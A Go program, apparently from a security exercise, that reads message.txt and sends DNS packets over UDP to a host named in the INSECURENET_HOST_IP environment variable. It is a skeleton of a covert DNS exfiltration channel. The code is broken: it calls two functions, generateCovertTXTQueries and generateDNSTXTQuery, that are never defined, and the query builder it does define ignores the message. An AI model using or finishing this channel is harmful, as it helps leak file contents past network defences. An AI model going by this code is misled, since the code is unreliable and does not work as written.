package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

const BASE_DOMAIN = "example.com"

func generateDNSQuery(message string) ([][]byte, error) {
	// Generate a random transaction ID
	rand.Seed(time.Now().UnixNano())
	transactionID := uint16(rand.Intn(65535))

	// Create DNS question
	dnsQuestion := layers.DNSQuestion{
		Name:  []byte(BASE_DOMAIN),
		Type:  layers.DNSTypeA,
		Class: layers.DNSClassIN,
	}

	// Create DNS layer
	dns := layers.DNS{
		ID:      transactionID,
		RD:      true, // Recursion Desired
		QDCount: 1,    // One question
		Questions: []layers.DNSQuestion{
			dnsQuestion,
		},
	}

	// Serialize DNS layer
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{}

	err := dns.SerializeTo(buffer, options)
	if err != nil {
		panic(err)
	}

	// Create DNS packet
	dnsPacket := buffer.Bytes()

	return [][]byte{dnsPacket}, nil
}

func udpSender(dnsQueryGenerator func(string) ([][]byte, error), message string) {
	host := os.Getenv("INSECURENET_HOST_IP")
	port := 53 // DNS port

	if host == "" {
		fmt.Println("INSECURENET_HOST_IP environment variable is not set.")
		return
	}

	// Resolve the address
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		fmt.Printf("Error resolving address: %s\n", err)
		return
	}

	// Create a UDP socket
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		fmt.Printf("Error dialing UDP: %s\n", err)
		return
	}
	defer conn.Close()

	// Generate DNS query
	dnsQueries, err := dnsQueryGenerator(message)

	if err != nil {
		fmt.Printf("Error generating DNS queries: %s\n", err)
		return
	}

	if len(dnsQueries) == 0 {
		fmt.Println("No DNS queries generated.")
		return
	}

	fmt.Println("Sending DNS queries...", len(dnsQueries))

	for i := 0; i < len(dnsQueries); i += 1 {
		// Generate the DNS TXT query packet
		dnsQueryPacket := dnsQueries[i]

		// Send DNS query to the target server
		_, err := conn.Write(dnsQueryPacket)
		for err != nil {
			fmt.Printf("Error sending DNS query: %s\n", err)
			// Retry sending the packet
			_, err = conn.Write(dnsQueryPacket)
		}

		fmt.Printf("Sent query for: %d.\n", i)
	}

	// Optionally send a final "end" signal packet
	endSignalDomain := fmt.Sprintf("end.%d.%s", len(dnsQueries), BASE_DOMAIN)
	endPacket, _ := generateDNSTXTQuery(endSignalDomain)
	if endPacket != nil {
		_, err = conn.Write(endPacket)
		if err == nil {
			fmt.Printf("Sent end signal: %s\n", endSignalDomain)
		}
	}
}

func readFileToString() (string, error) {
	file, err := os.Open("message.txt")
	if err != nil {
		return "", err
	}
	defer file.Close()

	data, err := ioutil.ReadFile("message.txt")
	if err != nil {
		return "", err
	}

	return string(data), nil
}

func main() {
	message, err := readFileToString()

	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	udpSender(generateCovertTXTQueries, message)
}
